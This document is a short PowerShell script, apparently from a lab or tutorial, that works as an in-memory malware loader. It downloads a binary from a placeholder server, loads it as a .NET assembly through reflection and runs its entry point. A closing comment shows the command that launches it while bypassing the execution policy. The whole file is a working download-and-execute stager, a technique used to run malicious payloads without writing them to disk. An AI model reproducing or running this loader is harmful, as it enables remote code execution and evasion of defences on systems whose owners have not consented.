# Save as: loader.ps1
$url = "http://your-server.com/payload.bin"  # Replace with local path in lab
$bytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] @()))

//powershell -ExecutionPolicy Bypass -File loader.ps1

